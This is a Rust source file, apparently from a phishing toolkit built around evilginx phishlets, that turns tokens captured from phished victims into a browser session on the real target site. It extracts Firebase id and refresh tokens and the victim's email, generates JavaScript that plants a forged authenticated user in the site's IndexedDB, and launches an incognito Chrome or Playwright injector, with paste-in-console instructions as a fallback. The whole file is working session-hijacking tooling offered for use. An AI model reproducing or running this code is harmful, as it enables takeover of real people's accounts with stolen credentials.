use std::fs;
use std::io::Write;
use std::process::{Command, Stdio};

use serde::Serialize;
use serde_json::Value;

use crate::error::{AppError, AppResult};
use crate::kit::kit_root;
use crate::recon::detect_target;

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct InjectScriptResult {
    pub ok: bool,
    pub script: String,
    pub api_key: String,
    pub message: String,
    pub login_url: String,
    pub id_token: String,
    pub refresh_token: String,
    /// Where to paste if auto-launch does not inject
    pub console_instructions: String,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct LaunchResult {
    pub ok: bool,
    pub url: String,
    pub message: String,
    pub script_copied: bool,
    pub console_instructions: String,
}

pub fn pull_firebase_key(target: String) -> AppResult<serde_json::Value> {
    let recon = detect_target(&target)?;
    let key = recon
        .stack_info
        .firebase_keys
        .first()
        .cloned()
        .unwrap_or_default();
    Ok(serde_json::json!({
        "ok": !key.is_empty(),
        "api_key": key,
        "stack": recon.stack_info.stack,
        "keys": recon.stack_info.firebase_keys,
    }))
}

fn normalize_host(target: &str) -> String {
    let mut host = target.trim().to_ascii_lowercase();
    if let Some(rest) = host.strip_prefix("https://") {
        host = rest.to_string();
    } else if let Some(rest) = host.strip_prefix("http://") {
        host = rest.to_string();
    }
    host.split('/')
        .next()
        .unwrap_or("")
        .split(':')
        .next()
        .unwrap_or("")
        .to_string()
}

/// Pull `domain` / `path` from a top-level YAML `login:` block (no look-around regex).
fn login_domain_path_from_phishlet(text: &str) -> (Option<String>, Option<String>) {
    let mut in_login = false;
    let mut domain = None;
    let mut path = None;
    for line in text.lines() {
        if !in_login {
            if line.trim() == "login:" {
                in_login = true;
            }
            continue;
        }
        // Next top-level key ends the block
        if !line.is_empty() && !line.starts_with([' ', '\t']) {
            break;
        }
        let t = line.trim();
        let (key, rest) = match t.split_once(':') {
            Some((k, r)) => (k.trim(), r.trim()),
            None => continue,
        };
        let val = rest.trim_matches('\'').trim_matches('"').trim().to_string();
        if val.is_empty() {
            continue;
        }
        match key {
            "domain" => domain = Some(val),
            "path" => path = Some(val),
            _ => {}
        }
    }
    (domain, path)
}

/// Resolve real-target login URL (not dry-run) from profile target + phishlet YAML.
pub fn target_login_url(target_domain: &str, phishlet_name: &str) -> AppResult<String> {
    let mut host = normalize_host(target_domain);
    let mut path = "/".to_string();
    if !phishlet_name.is_empty() {
        let root = kit_root()?;
        let f = root
            .join("kit/evilginx/phishlets")
            .join(format!("{phishlet_name}.yaml"));
        if f.is_file() {
            let text = fs::read_to_string(&f).unwrap_or_default();
            let (login_domain, login_path) = login_domain_path_from_phishlet(&text);
            if let Some(login_host) = login_domain {
                let login_host = login_host.to_ascii_lowercase();
                if !login_host.contains("local.phishkit") && !login_host.contains("local.test") {
                    host = normalize_host(&login_host);
                }
            }
            if let Some(p) = login_path {
                path = if p.is_empty() { "/".into() } else { p };
            }
        }
    }
    if host.is_empty() {
        return Err(AppError::msg("No target domain to open for session replay"));
    }
    if !path.starts_with('/') {
        path = format!("/{path}");
    }
    Ok(format!("https://{host}{path}"))
}

fn decode_email(raw: &str) -> String {
    // Captures sometimes URL-encode (@ → %40)
    let mut out = String::with_capacity(raw.len());
    let bytes = raw.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let (Some(h), Some(l)) = (
                (bytes[i + 1] as char).to_digit(16),
                (bytes[i + 2] as char).to_digit(16),
            ) {
                out.push(char::from_u32(h * 16 + l).unwrap_or('?'));
                i += 3;
                continue;
            }
        }
        out.push(bytes[i] as char);
        i += 1;
    }
    out
}

fn extract_tokens(capture: &Value) -> (String, String, String, String) {
    let custom = capture.get("custom").cloned().unwrap_or(Value::Null);
    let body = capture.get("body_tokens").cloned().unwrap_or(Value::Null);
    let id_token = custom
        .get("id_token")
        .or_else(|| body.get("id_token"))
        .or_else(|| capture.get("id_token"))
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    let refresh = custom
        .get("refresh_token")
        .or_else(|| body.get("refresh_token"))
        .or_else(|| capture.get("refresh_token"))
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    let local_id = custom
        .get("local_id")
        .or_else(|| body.get("localId"))
        .or_else(|| body.get("user_id"))
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    let email = capture
        .get("username")
        .and_then(|v| v.as_str())
        .map(decode_email)
        .unwrap_or_default();
    (id_token, refresh, local_id, email)
}

fn console_instructions(login_url: &str) -> String {
    format!(
        "If the browser did not restore the session automatically:\n\
         1. Open an incognito window to {login_url}\n\
         2. Open DevTools → Console (Chrome: ⌥⌘J / Ctrl+Shift+J)\n\
         3. Paste the restore script and press Enter\n\
         4. The page should reload into the captured session\n\
         Stay on the real target origin — not the dry-run lure host."
    )
}

pub fn build_restore_script(
    capture: Value,
    api_key: String,
    target_domain: Option<String>,
    phishlet: Option<String>,
) -> AppResult<InjectScriptResult> {
    let key = api_key.trim().to_string();
    if key.is_empty() || !key.starts_with("AIza") {
        return Err(AppError::msg("Firebase API key required (AIza…)"));
    }
    let (id_token, refresh, local_id, email) = extract_tokens(&capture);
    if id_token.is_empty() && refresh.is_empty() {
        return Err(AppError::msg(
            "Capture has no id_token/refresh_token — not a Firebase session?",
        ));
    }

    let login_url = match (target_domain.as_deref(), phishlet.as_deref()) {
        (Some(t), p) if !t.trim().is_empty() => target_login_url(t, p.unwrap_or(""))
            .unwrap_or_else(|_| format!("https://{}", normalize_host(t))),
        _ => String::new(),
    };

    // Firebase Auth IndexedDB uses in-line keys (keyPath: fbase_key) and stores
    // { fbase_key, value: user } — not put(user, key).
    let uid = if local_id.is_empty() {
        email.clone()
    } else {
        local_id.clone()
    };
    let script = format!(
        r#"(async () => {{
  const apiKey = {api_key};
  const appName = "[DEFAULT]";
  const accessToken = {id_token};
  const refreshToken = {refresh};
  const email = {email};
  const uid = {uid};
  const nowMs = Date.now();
  const user = {{
    uid,
    email,
    emailVerified: true,
    isAnonymous: false,
    providerData: [{{
      providerId: "password",
      uid: email || uid,
      email,
      displayName: null,
      photoURL: null,
      phoneNumber: null
    }}],
    stsTokenManager: {{
      refreshToken,
      accessToken,
      expirationTime: nowMs + 3600e3
    }},
    createdAt: String(nowMs),
    lastLoginAt: String(nowMs),
    apiKey,
    appName
  }};
  await new Promise((resolve, reject) => {{
    const open = indexedDB.open("firebaseLocalStorageDb");
    open.onupgradeneeded = () => {{
      const db = open.result;
      if (!db.objectStoreNames.contains("firebaseLocalStorage")) {{
        db.createObjectStore("firebaseLocalStorage", {{ keyPath: "fbase_key" }});
      }}
    }};
    open.onsuccess = () => {{
      const db = open.result;
      const tx = db.transaction("firebaseLocalStorage", "readwrite");
      tx.objectStore("firebaseLocalStorage").put({{
        fbase_key: `firebase:authUser:${{apiKey}}:${{appName}}`,
        value: user
      }});
      tx.oncomplete = () => resolve();
      tx.onerror = () => reject(tx.error);
    }};
    open.onerror = () => reject(open.error);
  }});
  console.log("phishkit: Firebase session written — reloading");
  location.reload();
}})();"#,
        api_key = serde_json::to_string(&key).unwrap(),
        uid = serde_json::to_string(&uid).unwrap(),
        email = serde_json::to_string(&email).unwrap(),
        refresh = serde_json::to_string(&refresh).unwrap(),
        id_token = serde_json::to_string(&id_token).unwrap(),
    );

    let instructions = if login_url.is_empty() {
        "Paste in DevTools → Console on the real app origin (incognito), then press Enter.".into()
    } else {
        console_instructions(&login_url)
    };

    Ok(InjectScriptResult {
        ok: true,
        script,
        api_key: key,
        message: "Restore script ready.".into(),
        login_url,
        id_token,
        refresh_token: refresh,
        console_instructions: instructions,
    })
}

pub fn launch_session_replay(
    capture: Value,
    api_key: String,
    target_domain: String,
    phishlet: String,
) -> AppResult<LaunchResult> {
    let built = build_restore_script(
        capture,
        api_key,
        Some(target_domain.clone()),
        Some(phishlet.clone()),
    )?;
    let url = if built.login_url.is_empty() {
        target_login_url(&target_domain, &phishlet)?
    } else {
        built.login_url.clone()
    };

    let root = kit_root()?;
    let launcher = root.join("scripts/launch_inject_browser.py");
    if !launcher.is_file() {
        // Fallback: open URL via `open` and copy script with pbcopy on macOS
        copy_to_clipboard(&built.script)?;
        let _ = Command::new("open")
            .args(["-na", "Google Chrome", "--args", "--incognito", &url])
            .spawn();
        return Ok(LaunchResult {
            ok: true,
            url: url.clone(),
            message: "Opened Chrome incognito; restore script copied to clipboard.".into(),
            script_copied: true,
            console_instructions: console_instructions(&url),
        });
    }

    let mut tmp = tempfile_js()?;
    tmp.write_all(built.script.as_bytes())?;
    let tmp_path = tmp.path().to_path_buf();
    // Keep file for child process
    let persist = tmp_path.with_extension("keep.js");
    fs::copy(&tmp_path, &persist)?;
    drop(tmp);
    let _ = fs::remove_file(&tmp_path);

    let python = {
        let venv = root.join("venv/bin/python3");
        if venv.is_file() {
            venv
        } else {
            std::path::PathBuf::from("python3")
        }
    };

    let child = Command::new(&python)
        .args([
            launcher.to_str().unwrap_or_default(),
            "--url",
            &url,
            "--script-file",
            persist.to_str().unwrap_or_default(),
        ])
        .current_dir(&root)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn();

    match child {
        Ok(_) => {
            // Also copy script so user can paste if Playwright inject fails
            let _ = copy_to_clipboard(&built.script);
            Ok(LaunchResult {
                ok: true,
                url: url.clone(),
                message: format!(
                    "Launching session replay at {url}. Script also copied — paste in Console if inject fails."
                ),
                script_copied: true,
                console_instructions: console_instructions(&url),
            })
        }
        Err(e) => {
            copy_to_clipboard(&built.script)?;
            let _ = Command::new("open")
                .args(["-na", "Google Chrome", "--args", "--incognito", &url])
                .spawn();
            Ok(LaunchResult {
                ok: true,
                url: url.clone(),
                message: format!(
                    "Launcher failed ({e}); opened Chrome and copied script to clipboard."
                ),
                script_copied: true,
                console_instructions: console_instructions(&url),
            })
        }
    }
}

fn tempfile_js() -> AppResult<tempfile::NamedTempFile> {
    tempfile::Builder::new()
        .prefix("phishkit-inject-")
        .suffix(".js")
        .tempfile()
        .map_err(|e| AppError::msg(format!("temp file: {e}")))
}

fn copy_to_clipboard(text: &str) -> AppResult<()> {
    #[cfg(target_os = "macos")]
    {
        let mut child = Command::new("pbcopy")
            .stdin(Stdio::piped())
            .spawn()
            .map_err(|e| AppError::msg(format!("pbcopy: {e}")))?;
        if let Some(mut stdin) = child.stdin.take() {
            stdin.write_all(text.as_bytes())?;
        }
        let _ = child.wait();
        Ok(())
    }
    #[cfg(not(target_os = "macos"))]
    {
        let _ = text;
        Ok(())
    }
}
